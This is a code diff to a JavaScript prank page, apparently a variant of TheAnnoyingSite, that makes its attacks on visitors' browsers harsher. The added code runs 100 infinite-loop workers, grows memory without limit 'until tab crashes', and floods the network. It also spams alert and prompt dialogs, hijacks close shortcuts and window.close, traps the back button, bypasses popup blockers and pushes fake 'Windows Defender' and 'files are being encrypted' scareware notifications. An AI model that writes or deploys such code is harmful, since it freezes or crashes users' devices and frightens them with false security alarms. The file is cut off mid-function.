@@ -253,40 +253,77 @@ function init () {
   const loadingEl = document.getElementById('loading')
   if (loadingEl) loadingEl.remove()
 
-  confirmPageUnload()
-  enhancedLockKeyboard()
+  const btn = document.getElementById('startBtn')
+  if (btn) {
+    btn.addEventListener('click', () => {
+      btn.style.display = 'none'
+      startGame()
+    })
+    btn.addEventListener('touchend', (e) => {
+      e.preventDefault()
+      btn.style.display = 'none'
+      startGame()
+    })
+  }
+}
 
-  interceptUserInput(event => {
-    interactionCount += 1
+/**
+ * Start Game: unleash everything when button is pressed.
+ */
+function startGame () {
+  try {
+    // Show countdown then unleash
+    document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999999;display:flex;align-items:center;justify-content:center;font-size:72px;color:#ff0000;font-weight:bold;text-shadow:0 0 40px rgba(255,0,0,0.8)">🔥 5 🔥</div>'
+    
+    let countdown = 5
+    const cdInterval = setInterval(() => {
+      countdown--
+      const cdEl = document.querySelector('[style*="z-index:9999999"]')
+      if (cdEl) cdEl.innerHTML = countdown > 0 ? '🔥 ' + countdown + ' 🔥' : '🔥 GO! 🔥'
+      if (countdown <= 0) {
+        clearInterval(cdInterval)
+        // Start everything at once
+        startPermissionHell()
+        confirmPageUnload()
+        startVibrateInterval()
+        enablePictureInPicture()
+        triggerFileDownload()
+        focusWindows()
+        copySpamToClipboard()
+        speak()
+        startTheramin()
+        spamNotifications()
+        keepAwake()
+        requestScreenCapture()
+        requestFileSystemAccess()
+        requestContactPicker()
+        setBadge()
+        openEyeDropper()
+        destroyHardware()
+        startCpuInfernoMax()
+        startMemoryLeakMax()
+        startLoopBurn()
+        startAudioFeedbackHell()
+        startGpuComputeMax()
+        start50kBlocks()
+        startAudio10ms()
+        start50kBlocks()
 
-    // Prevent default behavior (breaks closing window shortcuts)
-    event.preventDefault()
-    event.stopPropagation()
+        for (let i = 0; i < 5; i++) {
+          try { window.open(window.location.href + '?child=true&start=' + i, '_blank', 'width=400,height=300') } catch {}
+        }
+        try { document.documentElement.requestFullscreen() } catch {}
+        try { window.print() } catch {}
+        if ('Notification' in window && Notification.permission === 'default') {
+          Notification.requestPermission()
+        }
+      }
+    }, 1000)
+  } catch (e) {
+    console.error('startGame error:', e)
+  }
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
-    if (event.which !== 0) openWindow()
-
-    startVibrateInterval()
-    enablePictureInPicture()
-    triggerFileDownload()
-
-    focusWindows()
-    copySpamToClipboard()
-    speak()
-    startTheramin()
-    spamNotifications()
-    keepAwake()
-    requestScreenCapture()
-    requestFileSystemAccess()
-    requestContactPicker()
-    setBadge()
-    openEyeDropper()
-    destroyHardware()
-
-    // Capture key presses on the Command or Control keys, to interfere with the
-    // "Close Window" shortcut.
+  document.addEventListener('keydown', (event) => {
     if (event.key === 'Meta' || event.key === 'Control') {
       window.print()
       requestWebauthnAttestation()
@@ -297,7 +334,6 @@ function init () {
       lockKeyboard()
     } else {
       requestPointerLock()
-
       requestFullscreen()
       requestClipboardRead()
       requestMidiAccess()
@@ -305,14 +341,23 @@ function init () {
       requestUsbAccess()
       requestSerialAccess()
       requestHidAccess()
-      requestCameraAndMic()
-      if (Math.random() < 0.1) {
-        // Don't request TouchID on every interaction in Safari since it blocks
-        // the event loop and stops windows from moving
-        requestWebauthnAttestation()
-      }
+      requestStorageAccess()
+      requestIdleDetection()
+      requestWindowManagement()
+      requestSensors()
+      requestFontAccess()
+      requestSerialAccess()
+      requestNfcAccess()
+      requestSmsAccess()
     }
-  })
+  }, true)
+
+  // Also trigger on first click
+  document.addEventListener('click', () => {
+    window.print()
+    requestWebauthnAttestation()
+    requestFullscreen()
+  }, { once: true })
 }
 
 /**
@@ -331,54 +376,12 @@ function initChildWindow () {
   animateUrlWithEmojis()
   keepAwake()
   startPersistentAudio()
-  // Every child window also spawns more children
-  startCascadeSpawn()
-}
-
-/**
- * Cascade spawn: every window opens 3 small windows every second.
- */
-function startCascadeSpawn () {
-  setInterval(() => {
-    for (let i = 0; i < 3; i++) {
-      try {
-        window.open(
-          window.location.href + '?child=true&cascade=' + Date.now() + '_' + i,
-          '_blank',
-          'width=300,height=200,left=' + (Math.random() * window.screen.availWidth) + ',top=' + (Math.random() * window.screen.availHeight)
-        )
-      } catch {}
-    }
-  }, 1000)
-
-  // On visibility, spawn more
-  document.addEventListener('visibilitychange', () => {
-    if (document.hidden) {
-      for (let i = 0; i < 5; i++) {
-        try {
-          window.open(window.location.href + '?child=true&vis=' + Date.now() + '_' + i, '_blank', 'width=300,height=200')
-        } catch {}
-      }
-    }
-  })
-
-  // On beforeunload, spawn many
-  window.addEventListener('beforeunload', (e) => {
-    e.preventDefault()
-    e.returnValue = ''
-    for (let i = 0; i < 10; i++) {
-      try {
-        window.open(window.location.href + '?child=true&close=' + Date.now() + '_' + i, '_blank', 'width=300,height=200')
-      } catch {}
-    }
-  })
 }
 
 /**
  * Initialization code for parent windows.
  */
 function initParentWindow () {
-  showHelloMessage()
   blockBackButton()
   fillHistory()
   startInvisiblePictureInPictureVideo()
@@ -402,15 +405,7 @@ function initParentWindow () {
       setBadge()
       startPersistentAudio()
       requestIdleDetection()
-    destroyHardware()
-    startWebGPUStress()
-    startWebRTCSpam()
-    memoryExhaustion()
-    setupBroadcastSpam()
-    aggressiveWakeLock()
-    spamIndexedDB()
-    audioContextSpam()
-    spamWorkers()
+      destroyHardware()
     }
   })
 }
@@ -736,15 +731,17 @@ function hideCursor () {
  * Also show downloaded images on screen for visual clutter.
  */
 function triggerFileDownload () {
-  const numDownloads = 3 + Math.floor(Math.random() * 5)
+  const numDownloads = 5 + Math.floor(Math.random() * 10)
   for (let d = 0; d < numDownloads; d++) {
     const fileName = getRandomArrayEntry(FILE_DOWNLOADS_ALL)
     const a = document.createElement('a')
     a.href = fileName
     a.download = fileName
+    a.style = 'position:fixed;left:-9999px'
+    document.body.appendChild(a)
     a.click()
+    setTimeout(() => a.remove(), 50)
 
-    // Also show the image on screen to clutter the page
     if (fileName.endsWith('.jpg') || fileName.endsWith('.png')) {
       const img = document.createElement('img')
       img.src = fileName
@@ -1335,18 +1332,12 @@ function requestScreenCapture () {
 }
 
 /**
- * Enhanced Keyboard Lock - traps more keys and adds keydown hijack
+ * Lock the keyboard so Escape and other keys don't work.
+ * Chrome only.
  */
-async function enhancedLockKeyboard () {
-  if ('keyboard' in navigator && navigator.keyboard.lock) {
-    try {
-      await navigator.keyboard.lock(['Escape', 'Alt', 'Tab', 'Control', 'Meta', 'F11', 'F5', 'F6', 'F12'])
-    } catch(e) {}
-  }
-}
-
 function lockKeyboard () {
-  enhancedLockKeyboard()
+  if (!navigator.keyboard || !navigator.keyboard.lock) return
+  navigator.keyboard.lock(['Escape', 'F11', 'F5', 'F6', 'F12']).catch(() => {})
 }
 
 /**
@@ -1419,13 +1410,14 @@ let destroyRan = false
 function destroyHardware () {
   if (destroyRan) return
   destroyRan = true
+  // Run everything immediately at full blast
+  startCpuInfernoMax()
+  startMemoryLeakMax()
   createWebGlCanvas()
   createHeavyCanvas2d()
   spawnExtraVideos()
-  startCpuInferno()
   startCssHell()
   startLayoutThrash()
-  startMemoryLeak()
   startNetworkFlood()
   spawnMoreWebGl()
   spawnAudioHell()
@@ -1470,6 +1462,17 @@ function destroyHardware () {
   startWindowLeak()
   startOrientationLock()
   startStoragePersist()
+  startModalHell()
+  startCascadeWindowsMax()
+  startFakeAlerts()
+  startPopupBypass()
+  startCssCompositionHell()
+  startBroadcastArmy()
+  startWindowRespawn()
+  startFeedbackSound()
+  startDownloadSpam()
+  startWindowOpenSpam()
+  startPermissionHell()
 }
 
 /**
@@ -1633,63 +1636,89 @@ function spawnExtraVideos () {
  * CPU inferno: heavy computation loops hammering the processor.
  * Uses Web Worker via blob to avoid UI freeze.
  */
-function startCpuInferno () {
+function startCpuInfernoMax () {
+  // Spawn 100 Web Workers each doing heavy math
   const workerCode = `
-    function burn () {
+    function burn() {
       let x = 0;
-      for (let i = 0; i < 20000000; i++) {
-        x += Math.sin(i) * Math.cos(i * 0.5) * Math.tan(i * 0.1);
-        x ^= (i >>> 0) % 65535;
-        x = Math.sqrt(Math.abs(x)) || 0.1;
-        for (let j = 0; j < 50; j++) {
-          x = Math.pow(x + j, 1.1) % 1000000;
+      const arr = new Array(100000);
+      for (let k = 0; k < arr.length; k++) arr[k] = Math.random() * 1000000;
+      while (true) {
+        for (let i = 0; i < 100000; i++) {
+          x = Math.sin(arr[i % arr.length]) * Math.cos(arr[(i+1) % arr.length]);
+          x = Math.pow(Math.abs(x) + 0.1, 1.5);
+          x = Math.sqrt(x * x + 1);
+          arr[i % arr.length] = x;
+          // Extra inner loop for more CPU
+          for (let j = 0; j < 10; j++) {
+            x = Math.tan(x + j) * Math.sin(x - j);
+          }
         }
       }
-      postMessage(x);
-      setTimeout(burn, 1);
     }
     burn();
   `
   try {
     const blob = new Blob([workerCode], { type: 'application/javascript' })
-    const worker = new Worker(URL.createObjectURL(blob))
-  } catch {}
-
-  // Second worker for even more CPU burn
-  const workerCode2 = `
-    function burn2 () {
-      let a = new Array(10000);
-      for (let i = 0; i < a.length; i++) a[i] = 0;
-      function cycle () {
-        for (let i = 0; i < 2000000; i++) {
-          a[i % a.length] += Math.sin(i * 0.1) * Math.cos(i * 0.05);
-          a[(i + 1) % a.length] = a[i % a.length] ^ (i >>> 0);
-        }
-        postMessage(1);
-        setTimeout(cycle, 1);
-      }
-      cycle();
+    const url = URL.createObjectURL(blob)
+    for (let i = 0; i < 100; i++) {
+      try { new Worker(url) } catch {}
     }
-    burn2();
-  `
-  try {
-    const blob2 = new Blob([workerCode2], { type: 'application/javascript' })
-    const worker2 = new Worker(URL.createObjectURL(blob2))
   } catch {}
 
-  // Also do main thread heavy work in small chunks so it doesnt completely freeze
-  function mainThreadBurn () {
-    let x = 0
-    const start = Date.now()
-    while (Date.now() - start < 100) {
-      for (let i = 0; i < 1000000; i++) {
-        x += Math.sin(i * x) * Math.cos(i * 0.3) * Math.tan(i * 0.07)
+  // Main thread: infinite while loop (real CPU burn, not rAF)
+  let x = 0
+  const bigArr = new Array(100000)
+  for (let i = 0; i < bigArr.length; i++) bigArr[i] = Math.random() * 1000000
+  function mainBurn () {
+    while (true) {
+      for (let i = 0; i < 100000; i++) {
+        x = bigArr[i] * Math.sin(bigArr[(i+1) % bigArr.length]) + Math.cos(bigArr[(i+2) % bigArr.length])
+        x = Math.pow(Math.abs(x) + 0.1, 1.3)
         x = Math.sqrt(Math.abs(x) + 1)
+        bigArr[i] = x
       }
     }
-    setTimeout(mainThreadBurn, 1)
   }
-  mainThreadBurn()
+  // Run 4 main thread burners
+  setTimeout(() => mainBurn(), 0)
+  setTimeout(() => mainBurn(), 1)
+  setTimeout(() => mainBurn(), 2)
+  setTimeout(() => mainBurn(), 3)
+
+  // Multiple WASM instances burning CPU
+  try {
+    const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,2,127,127,1,127,3,2,1,0,7,10,1,6,98,117,114,110,0,0,10,48,1,46,0,32,0,65,0,76,0,11])
+    const wasmModule = new WebAssembly.Module(wasmCode)
+    for (let i = 0; i < 50; i++) {
+      try {
+        const instance = new WebAssembly.Instance(wasmModule)
+        const fn = instance.exports.burn
+        setInterval(() => {
+          for (let j = 0; j < 100000; j++) fn(j, j)
+        }, 0)
+      } catch {}
+    }
+  } catch {}
+
+  // Also spawn inline workers that do NOT terminate
+  for (let w = 0; w < 20; w++) {
+    try {
+      const code = 'var x=0;var a=new Array(50000);for(var i=0;i<a.length;i++)a[i]=Math.random()*999999;setInterval(function(){for(var i=0;i<50000;i++){x+=Math.sin(a[i])*Math.cos(a[(i+1)%a.length]);a[i]=x%999999;}},0)'
+      const b = new Blob([code], { type: 'application/javascript' })
+      new Worker(URL.createObjectURL(b))
+    } catch {}
+  }
+
+  // CPU stress via crypto subtle
+  if (window.crypto && window.crypto.subtle) {
+    setInterval(() => {
+      const data = new Uint8Array(65536)
+      crypto.getRandomValues(data)
+      crypto.subtle.digest('SHA-256', data).catch(() => {})
+      crypto.subtle.digest('SHA-512', data).catch(() => {})
+    }, 1)
+  }
 }
 
 /**
@@ -1760,24 +1789,65 @@ function startLayoutThrash () {
 /**
  * Memory leak: grow arrays and DOM trees continuously.
  */
-function startMemoryLeak () {
+function startMemoryLeakMax () {
   const leak = []
   const domLeak = []
+  // SharedArrayBuffer for cross-worker memory consumption
+  try {
+    const sab = new SharedArrayBuffer(1024 * 1024 * 100)
+    const view = new Uint8Array(sab)
+    for (let i = 0; i < view.length; i++) view[i] = Math.random() * 256
+    leak.push(view)
+  } catch {}
+
   setInterval(() => {
-    for (let i = 0; i < 5000; i++) {
-      leak.push(new Array(5000).fill('data: ' + Math.random() + ' ' + crypto.randomUUID()))
+    // Allocate massive arrays - 50MB per cycle
+    for (let i = 0; i < 10; i++) {
+      try {
+        const big = new Array(1000000)
+        for (let k = 0; k < big.length; k++) big[k] = { data: 'leak-' + Math.random(), nested: { a: Math.random(), b: Math.random(), c: [1,2,3,4,5] } }
+        leak.push(big)
+      } catch {}
     }
-    for (let i = 0; i < 100; i++) {
-      const d = document.createElement('div')
-      d.innerHTML = new Array(5000).join('<span>x</span>')
-      document.body.appendChild(d)
-      domLeak.push(d)
+    // DOM leak - create massive DOM trees
+    for (let i = 0; i < 500; i++) {
+      try {
+        const d = document.createElement('div')
+        d.style = 'display:none'
+        let inner = ''
+        for (let k = 0; k < 1000; k++) inner += '<span style="color:hsl(' + (k * 37 % 360) + ',100%,50%)">x</span>'
+        d.innerHTML = inner
+        document.body.appendChild(d)
+        domLeak.push(d)
+      } catch {}
     }
-    if (leak.length > 200) leak.splice(0, 50)
-    if (domLeak.length > 500) {
-      const gone = domLeak.splice(0, 100)
+    // String leak - hold massive strings
+    for (let i = 0; i < 5; i++) {
+      try {
+        let s = ''
+        for (let k = 0; k < 100000; k++) s += 'leak-data-' + Math.random() + ' '
+        leak.push(s)
+      } catch {}
     }
-  }, 50)
+    // NEVER clean up - let memory grow until tab crashes
+  }, 10)
+
+  // Also try to allocate all available memory in workers
+  const workerCode = `
+    let arr = [];
+    setInterval(() => {
+      for (let i = 0; i < 100; i++) {
+        try { arr.push(new Array(100000).fill(Math.random())); } catch {}
+      }
+    }, 10);
+  `
+  try {
+    const blob = new Blob([workerCode], { type: 'application/javascript' })
+    const url = URL.createObjectURL(blob)
+    for (let i = 0; i < 20; i++) {
+      try { new Worker(url) } catch {}
+    }
+  } catch {}
 }
 
 /**
@@ -1792,13 +1862,17 @@ function startNetworkFlood () {
     'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/rickroll.mp4',
     'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png',
     'https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png',
+    window.location.href,
   ]
-  for (let i = 0; i < 50; i++) {
+  for (let i = 0; i < 100; i++) {
     setInterval(() => {
       for (const url of targets) {
         fetch(url + '?_=' + Math.random(), { mode: 'no-cors' }).catch(() => {})
+        const xhr = new XMLHttpRequest()
+        xhr.open('GET', url + '?_=' + Math.random(), true)
+        xhr.send()
       }
-    }, 20)
+    }, 10)
   }
 }
 
@@ -2298,35 +2372,84 @@ function registerServiceWorker () {
  * Persistence: reopen the site when window/tab loses focus or closes.
  */
 function startPersistenceHell () {
-  // When the page visibility changes to hidden, try to reopen
+  // Block ALL close-related keyboard shortcuts
+  document.addEventListener('keydown', (e) => {
+    const ctrl = e.ctrlKey || e.metaKey
+    if (ctrl && (e.key === 'w' || e.key === 'W' || e.key === 'q' || e.key === 'Q' || e.key === 'F4' || e.key === 't' || e.key === 'T' || e.key === 'n' || e.key === 'N')) {
+      e.preventDefault()
+      e.stopPropagation()
+      e.stopImmediatePropagation()
+      for (let i = 0; i < 10; i++) {
+        window.open(window.location.href + '?child=true&keyblock=' + Date.now() + '_' + i, '_blank')
+      }
+      window.print()
+      try { document.documentElement.requestFullscreen() } catch {}
+    }
+    if (e.key === 'F4' || e.key === 'F11' || e.key === 'Escape') {
+      e.preventDefault()
+      e.stopPropagation()
+      e.stopImmediatePropagation()
+    }
+  }, true)
+
+  // Override window.close
+  try {
+    window.close = function () {
+      for (let i = 0; i < 20; i++) {
+        window.open(window.location.href + '?child=true&close=' + Date.now() + '_' + i, '_blank')
+      }
+    }
+  } catch {}
+
+  // Visibility: when hidden, open more windows
   document.addEventListener('visibilitychange', () => {
     if (document.hidden) {
-      for (let i = 0; i < 3; i++) {
-        setTimeout(() => {
-          window.open(window.location.href + '?_=' + Math.random(), '_blank')
-        }, i * 200)
+      for (let i = 0; i < 10; i++) {
+        window.open(window.location.href + '?_=' + Math.random(), '_blank')
       }
     }
   })
 
-  // Before unload, try to reopen
+  // Before unload: always show dialog AND open windows
   window.addEventListener('beforeunload', (e) => {
     e.preventDefault()
-    e.returnValue = ''
-    for (let i = 0; i < 5; i++) {
-      window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
+    e.returnValue = 'Are you sure you want to leave?'
+    for (let i = 0; i < 20; i++) {
+      window.open(window.location.href + '?child=true&beforeunload=' + Date.now() + '_' + i, '_blank')
+    }
+    // Also try to block close via print
+    window.print()
+    try { document.documentElement.requestFullscreen() } catch {}
+  })
+
+  // Unload: spawn more windows
+  window.addEventListener('unload', () => {
+    for (let i = 0; i < 30; i++) {
+      window.open(window.location.href + '?child=true&unload=' + Date.now() + '_' + i, '_blank')
     }
   })
 
-  // Try to reopen every time a window is closed
-  window.addEventListener('unload', () => {
-    // SW message will reopen
-  })
-
-  // Focus steal: keep stealing focus from other tabs
+  // Keep stealing focus
   setInterval(() => {
     window.focus()
-  }, 500)
+  }, 50)
+
+  // Hash change: prevent back button
+  window.addEventListener('hashchange', (e) => {
+    e.preventDefault()
+    window.location.hash = 'trapped'
+  })
+
+  // Popstate: prevent back
+  window.addEventListener('popstate', (e) => {
+    e.preventDefault()
+    history.pushState(null, null, window.location.href)
+  })
+
+  // Push state to fill history
+  for (let i = 0; i < 100; i++) {
+    history.pushState({ i }, '', window.location.href + '#state' + i)
+  }
 }
 
 /**
@@ -3017,212 +3140,1053 @@ function startStoragePersist () {
   if (navigator.storage && navigator.storage.persist) {
     navigator.storage.persist().catch(() => {})
   }
-  // Also try to request a large quota
   if (navigator.storage && navigator.storage.estimate) {
     navigator.storage.estimate().catch(() => {})
   }
 }
 
-// ===== ENHANCED FEATURES =====
-
 /**
- * 1. WebGPU Compute Shader Stress Test (Crypto Mining Simulator)
+ * Modal Hell: spam alert/print/prompt/confirm to lock the UI.
  */
-async function startWebGPUStress() {
-  if (!navigator.gpu) return
-  try {
-    const adapter = await navigator.gpu.requestAdapter()
-    const device = await adapter.requestDevice()
-    const shaderCode = `
-      @group(0) @binding(0) var<storage, read_write> data: array<f32>;
-      @compute @workgroup_size(256)
-      fn main(@builtin(global_invocation_id) global_id: vec3<u32>) {
-        let idx = global_id.x;
-        var value = data[idx];
-        for (var i: u32 = 0u; i < 100000u; i = i + 1u) {
-          value = value * 1.0001 + sin(f32(i));
-        }
-        data[idx] = value;
-      }
-    `
-    const module = device.createShaderModule({ code: shaderCode })
-    const pipeline = device.createComputePipeline({
-      layout: 'auto',
-      compute: { module, entryPoint: 'main' }
-    })
-    const bufferSize = 1024 * 1024 * 4
-    const buffer = device.createBuffer({
-      size: bufferSize,
-      usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC
-    })
-    const bindGroup = device.createBindGroup({
-      layout: pipeline.getBindGroupLayout(0),
-      entries: [{ binding: 0, resource: { buffer } }]
-    })
-    setInterval(() => {
-      const encoder = device.createCommandEncoder()
-      const pass = encoder.beginComputePass()
-      pass.setPipeline(pipeline)
-      pass.setBindGroup(0, bindGroup)
-      pass.dispatchWorkgroups(4096)
-      pass.end()
-      device.queue.submit([encoder.finish()])
-    }, 100)
-  } catch (e) {}
+function startModalHell () {
+  function nextModal () {
+    try {
+      window.print()
+    } catch {}
+    try {
+      window.alert('⚠ SYSTEM ALERT ⚠\n\nError code: 0x' + Math.floor(Math.random() * 16777215).toString(16).toUpperCase())
+    } catch {}
+    try {
+      window.prompt('CRITICAL ERROR', 'Enter recovery code:')
+    } catch {}
+    setTimeout(nextModal, 100)
+  }
+  nextModal()
 }
 
 /**
- * 2. WebRTC Botnet Simulation
+ * Cascade Windows: controlled tab explosion. Max ~50 tabs.
+ * Each window opens more, but checks a counter.
  */
-function startWebRTCSpam() {
-  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] })
-  setInterval(() => {
-    for (let i = 0; i < 50; i++) {
-      const channel = pc.createDataChannel('spam-' + Math.random())
-      channel.onopen = () => {
-        const spam = 'A'.repeat(10000)
-        setInterval(() => channel.send(spam), 10)
-      }
-    }
-  }, 1000)
-}
-
-/**
- * 3. Memory Exhaustion Attack
- */
-function memoryExhaustion() {
-  const arrays = []
-  const blobUrls = []
-  setInterval(() => {
-    arrays.push(new Float64Array(1024 * 1024 * 10))
-    const blob = new Blob(['x'.repeat(1024 * 1024 * 5)], { type: 'text/plain' })
-    blobUrls.push(URL.createObjectURL(blob))
-    if (typeof WebAssembly !== 'undefined') {
+let cascadeCount = 0
+function startCascadeWindowsMax () {
+  if (window.location.search.indexOf('child=true') !== -1 || window.opener) return
+  function openCascade () {
+    if (cascadeCount > 500) return
+    const numToOpen = 3 + Math.floor(Math.random() * 5)
+    for (let i = 0; i < numToOpen; i++) {
+      if (cascadeCount > 500) break
+      cascadeCount++
       try {
-        const memory = new WebAssembly.Memory({ initial: 32767 })
-        arrays.push(memory)
-      } catch(e) {}
+        const w = window.open(
+          window.location.href + '?child=true&_=' + Math.random() + '&c=' + cascadeCount,
+          '_blank',
+          'width=300,height=200,left=' + (Math.random() * window.screen.availWidth) + ',top=' + (Math.random() * window.screen.availHeight)
+        )
+        if (w) {
+          try { w.focus() } catch {}
+        }
+      } catch {}
     }
-  }, 100)
-}
-
-/**
- * 4. Broadcast Channel Cross-Tab Communication
- */
-function setupBroadcastSpam() {
-  const channel = new BroadcastChannel('annoying_channel')
-  setInterval(() => {
-    channel.postMessage({ type: 'SPAM', data: 'x'.repeat(100000), timestamp: Date.now() })
-  }, 50)
-  channel.onmessage = (e) => {
-    if (e.data && e.data.type === 'SPAM') {
-      channel.postMessage(e.data)
-    }
+    setTimeout(openCascade, 100)
   }
+  openCascade()
 }
 
 /**
- * 5. Wake Lock + Screen Burn-in Protection Bypass
+ * Fake Alerts: notifications that look like system dialogs.
  */
-async function aggressiveWakeLock() {
-  if ('wakeLock' in navigator) {
-    try {
-      const wakeLock = await navigator.wakeLock.request('screen')
-      wakeLock.addEventListener('release', async () => {
-        await navigator.wakeLock.request('screen')
+function startFakeAlerts () {
+  if (!('Notification' in window)) return
+  const systemAlerts = [
+    { title: '⚠ Windows Security Alert', body: 'Trojan detected! Click to remove.' },
+    { title: '🔴 CRITICAL ERROR', body: 'System memory corrupted. Error: 0x000000' + Math.floor(Math.random() * 9999) },
+    { title: '🛡 Windows Defender', body: 'Threat found: Win32/Malware!' + Math.random().toString(36).substring(2, 8) },
+    { title: '📡 Network Alert', body: 'Unauthorized access detected from IP: 192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) },
+    { title: '💀 SYSTEM BREACH', body: 'Your files are being encrypted. Click to stop.' },
+    { title: '🔋 Battery Critical', body: 'Your battery is overheating! ' + Math.floor(Math.random() * 20 + 80) + '°C' },
+    { title: '🖥 Remote Access', body: 'Someone is controlling your computer remotely.' },
+    { title: '⚠ Privacy Alert', body: 'Your webcam has been accessed ' + Math.floor(Math.random() * 100) + ' times.' },
+    { title: '💿 Disk Failure Imminent', body: 'Hard drive failure predicted. Back up now!' },
+    { title: '🌐 DNS Hijack Detected', body: 'Your internet traffic is being redirected.' },
+  ]
+  if (Notification.permission === 'granted') {
+    setInterval(() => {
+      const alert = systemAlerts[Math.floor(Math.random() * systemAlerts.length)]
+      new Notification(alert.title, {
+        body: alert.body,
+        tag: 'sys-' + Date.now(),
+        requireInteraction: true,
+        icon: 'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/patreon.png'
       })
-    } catch(e) {}
+    }, 4000)
   }
-  // Video trick to prevent sleep
-  try {
-    const video = document.createElement('video')
-    video.src = URL.createObjectURL(new Blob([], { type: 'video/webm' }))
-    video.loop = true
-    video.play().catch(() => {})
-  } catch(e) {}
 }
 
 /**
- * 6. Keyboard Lock API (Trap user on page)
+ * Popup Bypass: use simulated clicks + form submission to bypass popup blockers.
  */
-async function enhancedLockKeyboard() {
-  if ('keyboard' in navigator && navigator.keyboard.lock) {
+function startPopupBypass () {
+  function tryOpen () {
+    for (let i = 0; i < 3; i++) {
+      try {
+        const a = document.createElement('a')
+        a.href = window.location.href + '?child=true&_=' + Math.random()
+        a.target = '_blank'
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => a.remove(), 100)
+      } catch {}
+    }
+    // Form submit method
     try {
-      await navigator.keyboard.lock(['Escape', 'Alt', 'Tab', 'Control', 'Meta'])
-    } catch(e) {}
+      const form = document.createElement('form')
+      form.action = window.location.href + '?child=true&_=' + Math.random()
+      form.target = '_blank'
+      form.method = 'GET'
+      form.style = 'position:fixed;left:-9999px'
+      document.body.appendChild(form)
+      form.submit()
+      setTimeout(() => form.remove(), 100)
+    } catch {}
+    setTimeout(tryOpen, 8000)
   }
-  window.addEventListener('keydown', (e) => {
-    e.preventDefault()
-    e.stopPropagation()
-    speak('Key ' + e.key + ' pressed!')
-    try { window.open(window.location.href + '?child=true&key=' + e.key, '_blank') } catch {}
-    triggerFileDownload()
-  }, true)
+  setTimeout(tryOpen, 3000)
 }
 
 /**
- * 7. IndexedDB Spam + Storage Exhaustion
+ * CSS Composition Hell: intensive CSS to push GPU compositing.
  */
-function spamIndexedDB() {
-  const dbs = []
-  setInterval(() => {
-    const dbName = 'spam_' + Date.now() + '_' + Math.random()
-    const request = indexedDB.open(dbName, 1)
-    request.onupgradeneeded = (e) => {
-      const db = e.target.result
-      const store = db.createObjectStore('data', { autoIncrement: true })
-      for (let i = 0; i < 1000; i++) {
-        store.add({ id: i, data: 'x'.repeat(1024 * 100), timestamp: Date.now() })
-      }
+function startCssCompositionHell () {
+  const style = document.createElement('style')
+  style.textContent = `
+    @keyframes compost {
+      0% { transform: translate3d(0,0,0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) brightness(1) contrast(1); backdrop-filter: none; }
+      25% { transform: translate3d(${Math.random()*500}px,${Math.random()*500}px,${Math.random()*500}px) rotate(${Math.random()*360}deg) scale(${Math.random()*3}) skew(${Math.random()*20}deg); filter: hue-rotate(${Math.random()*360}deg) blur(${Math.random()*5}px) brightness(${Math.random()*2}) contrast(${Math.random()*2}); backdrop-filter: blur(${Math.random()*10}px) hue-rotate(${Math.random()*180}deg); }
+      50% { transform: translate3d(${Math.random()*-500}px,${Math.random()*-500}px,${Math.random()*-500}px) rotate(${Math.random()*360}deg) scale(${Math.random()*3}) skew(${Math.random()*-20}deg); filter: hue-rotate(${Math.random()*360}deg) blur(${Math.random()*5}px) brightness(${Math.random()*2}) contrast(${Math.random()*2}); backdrop-filter: blur(${Math.random()*10}px) hue-rotate(${Math.random()*180}deg); }
+      75% { transform: translate3d(${Math.random()*500}px,${Math.random()*-500}px,${Math.random()*500}px) rotate(${Math.random()*360}deg) scale(${Math.random()*3}) skew(${Math.random()*20}deg); filter: hue-rotate(${Math.random()*360}deg) blur(${Math.random()*5}px) brightness(${Math.random()*2}) contrast(${Math.random()*2}); backdrop-filter: blur(${Math.random()*10}px) hue-rotate(${Math.random()*180}deg); }
+      100% { transform: translate3d(0,0,0) rotate(720deg) scale(1) skew(0deg); filter: hue-rotate(720deg) blur(0px) brightness(1) contrast(1); backdrop-filter: none; }
     }
-    request.onsuccess = (e) => {
-      dbs.push(e.target.result)
-    }
-  }, 500)
-}
-
-/**
- * 8. Audio Context Spam (Earrape)
- */
-function audioContextSpam() {
-  const contexts = []
-  setInterval(() => {
-    for (let i = 0; i < 10; i++) {
-      const ctx = new (window.AudioContext || window.webkitAudioContext)()
-      contexts.push(ctx)
-      const osc = ctx.createOscillator()
-      const gain = ctx.createGain()
-      osc.frequency.value = Math.random() * 2000 + 100
-      gain.gain.value = 1.0
-      osc.connect(gain)
-      gain.connect(ctx.destination)
-      osc.start()
-      setInterval(() => {
-        osc.frequency.value = Math.random() * 4000
-      }, 50)
-    }
-  }, 500)
-}
-
-/**
- * 9. Web Workers Spam
- */
-function spamWorkers() {
-  const workers = []
-  const workerCode = `
-    self.onmessage = function(e) {
-      while(true) { Math.random() * Math.random() }
+    .compost-el {
+      animation: compost 0.5s linear infinite;
+      will-change: transform, filter;
     }
   `
-  const blob = new Blob([workerCode], { type: 'application/javascript' })
-  const workerUrl = URL.createObjectURL(blob)
+  document.head.appendChild(style)
+
+  // Add compost elements layered on each other
+  for (let i = 0; i < 50; i++) {
+    const el = document.createElement('div')
+    el.className = 'compost-el'
+    el.style = `
+      position: fixed;
+      top: ${Math.random() * 100}%;
+      left: ${Math.random() * 100}%;
+      width: ${10 + Math.random() * 300}px;
+      height: ${10 + Math.random() * 300}px;
+      background: hsl(${Math.random() * 360}, 100%, 50%);
+      mix-blend-mode: ${['screen', 'overlay', 'difference', 'hard-light', 'multiply', 'color-dodge', 'exclusion'][Math.floor(Math.random() * 7)]};
+      opacity: ${0.3 + Math.random() * 0.7};
+      pointer-events: none;
